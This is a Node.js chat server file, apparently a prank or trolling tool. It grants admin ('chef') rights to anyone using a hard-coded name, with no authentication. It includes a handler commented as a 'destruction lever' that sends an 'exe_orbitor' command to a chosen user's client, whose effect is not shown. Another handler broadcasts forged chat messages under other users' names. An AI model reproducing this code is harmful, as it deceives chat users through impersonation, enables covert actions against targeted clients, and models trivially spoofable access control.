const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

let users = {};
io.on('connection', (socket) => {
    socket.on('init', (data) => {
        users[socket.id] = { id: socket.id, name: data.name, chef: data.name === "toucheur2pp" };
        io.emit('sync', Object.values(users));
    });

    // --- LEVIER DE DESTRUCTION ---
    socket.on('launch_orbitor', (sid) => {
        if(users[socket.id]?.chef) io.to(sid).emit('exe_orbitor', { master: users[socket.id].name });
    });

    socket.on('force_fake_msg', (data) => {
        if(users[socket.id]?.chef) io.emit('chat_msg', { name: data.targetName, text: data.fakeText, fake: true });
    });

    socket.on('disconnect', () => { delete users[socket.id]; io.emit('sync', Object.values(users)); });
    socket.on('chat_msg', (d) => { io.emit('chat_msg', { name: users[socket.id].name, text: d.text }); });
});

http.listen(3000, () => console.log("NEBULA V41 : PROTOCOLE ORBITOR ACTIVÉ"));
